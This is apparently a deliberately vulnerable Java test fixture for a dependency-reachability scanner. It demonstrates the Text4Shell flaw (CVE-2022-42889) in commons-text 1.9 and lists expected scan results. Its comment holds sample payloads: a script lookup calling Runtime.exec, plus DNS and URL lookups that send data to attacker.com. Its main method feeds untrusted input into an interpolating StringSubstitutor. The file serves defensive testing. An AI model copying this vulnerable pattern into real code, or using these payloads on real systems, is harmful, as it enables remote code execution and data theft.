package com.example;

import org.apache.commons.text.StringSubstitutor;
import org.apache.commons.text.lookup.StringLookupFactory;

/**
 * Vulnerable Text4Shell demo — CVE-2022-42889.
 *
 * Uses commons-text 1.9 with StringSubstitutor and interpolatorStringLookup(),
 * which in version 1.9 includes dangerous lookup handlers:
 *   ${script:javascript:Runtime.getRuntime().exec(...)}  -> RCE
 *   ${dns:attacker.com}                                  -> DNS exfiltration
 *   ${url:http://attacker.com/steal?data=...}            -> SSRF
 *
 * Call chain:
 *   App.main()
 *   └── StringSubstitutor.replace(template)   <- seeded vulnerable method
 *       └── StringSubstitutor.substitute(...)
 *           └── InterpolatorStringLookup.lookup(variableName)
 *               └── ScriptStringLookup.lookup(...)   <- RCE
 *
 * Expected pipeline result:
 *   static.status : reachable
 *   decision      : under_investigation (L3, no runtime trace)
 *   risk_score    : 4.9  (CVSS 9.8 x 0.50)
 *
 * Package-level scanner (Dependabot / OWASP DC): VULNERABLE
 * Method-level reachability:                     REACHABLE
 */
public class App {

    public static void main(String[] args) {
        String template = args.length > 0 ? args[0] : "Hello ${sys:user.name}";
        StringSubstitutor sub = new StringSubstitutor(
            StringLookupFactory.INSTANCE.interpolatorStringLookup()
        );
        String result = sub.replace(template);
        System.out.println("Result: " + result);
    }
}
